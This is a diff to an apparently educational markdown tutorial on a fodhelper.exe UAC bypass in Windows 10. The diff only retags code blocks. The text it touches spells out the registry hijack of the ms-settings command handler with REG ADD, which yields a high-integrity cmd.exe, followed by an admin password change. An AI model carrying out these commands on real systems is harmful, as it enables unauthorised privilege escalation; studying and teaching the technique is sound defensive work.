@@ -16,7 +16,7 @@ The fodhelper.exe binary runs as _high integrity_ on Windows 10 1709. We can
 
 In order to gather detailed information regarding the fodhelper integrity level and the permissions required to run this process, we will inspect its _application manifest_. The application manifest is an XML file containing information that lets the operating system know how to handle the program when it is started. We'll inspect the manifest with the sigcheck utility from Sysinternals, passing the -a argument to obtain extended information and -m to dump the manifest.
 
-```
+```powershell 
 C:\> cd C:\Tools\privilege_escalation\SysinternalsSuite
 
 C:\Tools\privilege_escalation\SysinternalsSuite> sigcheck.exe /accepteula -a -m C:\Windows\System32\fodhelper.exe
@@ -71,7 +71,7 @@ A quick look at the results shows that the application is meant to be run by adm
 
 This could allow us to hijack the execution through a properly formatted protocol handler. Let's try to add this key with the _REG_ utility:
 
-```
+```powershell
 C:\Users\admin> REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
 The operation completed successfully.
 
@@ -82,21 +82,21 @@ Fodhelper.exe attempts to query a value (DelegateExecute) stored in our newly-c
 
 We will use REG ADD with the /v argument to specify the value name and /t to specify the type:
 
-```
+```powershell
 C:\Users\admin> REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
 The operation completed successfully.
 ```
 
 We'll set our new registry value. We'll also specify the new registry value with /d "cmd.exe" and /f to add the value silently.
 
-```
+```powershell
 C:\Users\admin> REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
 The operation completed successfully.
 ```
 
 After setting the value and running fodhelper.exe once again, we are presented with a command shell. The output of the whoami /groups command indicates that this is a high-integrity command shell. Next, we'll attempt to change the admin password to see if we can successfully bypass UAC:
 
-```
+```powershell
 C:\Windows\system32> net user admin Ev!lpass
 The command completed successfully.
 ```
